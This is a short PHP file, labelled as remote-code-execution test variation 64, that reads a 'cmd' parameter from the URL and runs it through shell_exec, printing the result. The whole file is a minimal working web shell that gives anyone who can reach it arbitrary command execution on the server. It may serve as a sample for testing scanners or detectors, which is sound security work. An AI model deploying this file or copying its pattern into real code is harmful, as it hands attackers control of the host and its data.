<?php
// RCE test variation #64
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>